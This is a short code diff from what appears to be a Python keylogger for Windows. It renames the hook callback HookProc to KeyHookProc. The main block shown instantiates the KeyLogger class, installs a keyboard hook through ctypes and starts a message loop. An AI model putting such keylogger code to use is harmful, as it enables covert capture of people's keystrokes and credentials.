@@ -419,7 +419,7 @@ class KeyLogger:
 
 
 
-def HookProc( nCode, wParam, lParam ):
+def KeyHookProc( nCode, wParam, lParam ):
 
 
 #
@@ -520,7 +520,7 @@ def HookProc( nCode, wParam, lParam ):
 if __name__=="__main__":
 
     KeyLogger = KeyLogger()
-    pointer = HOOKPROC( HookProc )
+    pointer = HOOKPROC( KeyHookProc )
     KeyLogger.InstallHookProc( pointer )
     msg = ctypes.wintypes.MSG()
     user32.GetMessageA( byref(msg), 0, 0, 0 )
